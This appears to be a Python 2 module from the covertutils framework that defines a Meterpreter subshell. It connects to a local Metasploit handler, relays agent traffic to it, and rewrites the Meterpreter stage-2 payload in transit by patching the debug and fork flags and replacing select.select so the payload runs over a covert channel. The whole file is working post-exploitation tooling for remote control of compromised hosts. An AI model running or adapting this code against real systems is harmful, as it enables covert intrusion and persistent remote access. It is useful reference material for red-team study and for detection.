from covertutils.shells.subshells import SimpleSubShell

# from covertutils.payloads.generic.meterpreter import stage2_patches
import socket
import threading
from time import sleep

import struct


__select_replacement = '''
import select
def dummy(*args, **kwargs) :
	if s.empty() : return [],[],[]
	return [s],[],[]
select.select = dummy
'''

stage2_patches = [

	# ("PACKET_XOR_KEY_SIZE = 4", "PACKET_XOR_KEY_SIZE = 0"),
	("DEBUGGING = False", "DEBUGGING = True"),
	("#!/usr/bin/python", 'print "[!!!] METERPRETER passed control!"'),
	("TRY_TO_FORK = True", "TRY_TO_FORK = False"),
	("import select", __select_replacement),
	(' = ', '='),
	(', ',',')
]




def meterpreter_proxy( proxy_socket, instance ) :
	print ("Started Meterpreter Proxy thread")
	b = 42231
	# b = 41116
	# b = 4096
	# b = 2048
	stage_sent = False
	while True :

		# print "recv'ing",
		resp = proxy_socket.recv(b)
		# print "recv()'d %d bytes of data'" % b
		# if resp :
			# print "[+] Received from Handler: " + resp.encode('hex')

		if "#!/usr/bin/python" in resp :
			print "[!]Injecting select.select bypass"
			resp2 = resp
			for patch in stage2_patches :		# apply patches to source
				resp2 = resp2.replace(*patch)

			l = len(resp2)
			print "Final Length = %d" % l
			resp = struct.pack("<I", l) + resp2[4:]	# prepending the new length integer

		instance.stats['outgoing'] += len(resp)
		instance.handler.preferred_send( resp, instance.stream )
		if not stage_sent :
			stage_sent = True

		# if stage_sent
		# sleep(0.01)
		# b = 64

class MeterpreterSubShell ( SimpleSubShell ) :

# 	intro = """
# This is an Example Shell. It has a custom prompt, and reverses all input before sending to the stage.
# 	"""

	def __init__( self, stream, handler, queue_dict, base_shell, ignore_messages = set(), prompt_templ = "{stream} < ") :
		SimpleSubShell.__init__( self, stream, handler, queue_dict, base_shell, ignore_messages, prompt_templ )
		"""A method that uses the `prompt_templ` argument
		to reformat the prompt
		(in case the `format()` {tags} have changed)"""
		self.updatePrompt()

		def meterpreter_send(message, instance) :
			if message in ignore_messages : return
			print ("[+] Received from Agent {")
			print "[!] '%s'" % message.encode('hex')
			send_len = instance.proxy.send(message)
			instance.stats['incoming'] += len(message)
			print "[+] Message Delivered to Handler! (%d bytes)}" % send_len

		print ("Creating Proxy socket")
		self.proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.proxy.connect(("127.0.0.1",4444))		# Metasploits Handler
		print ("Connected to meterpreter handler socket!")

		self.stats = {
			'incoming' : 0,
			'outgoing' : 0,
			'handler' : None,
		}

		self.message_function = meterpreter_send
		sleep(0.1)
		self.proxy_thread = threading.Thread( target = meterpreter_proxy, args = ( self.proxy, self ) )
		self.proxy_thread.daemon = True
		self.proxy_thread.start()

		self.pinger_thread = threading.Thread( target = self.ping_meterpreter )
		self.pinger_thread.daemon = True
		self.pinger_thread.start()


	def default( self, line ) :
		print self.stats
		# command = line[::-1]	# Reversing the user input string
		# print( "Sending '%s' to the 'meterpreter' agent!" % line )
		# self.handler.preferred_send( line, self.stream )
		pass

	def ping_meterpreter( self, ping = 'X', delay = 1 ) :
		while True :
			self.handler.preferred_send( ping, self.stream )
			sleep(delay)
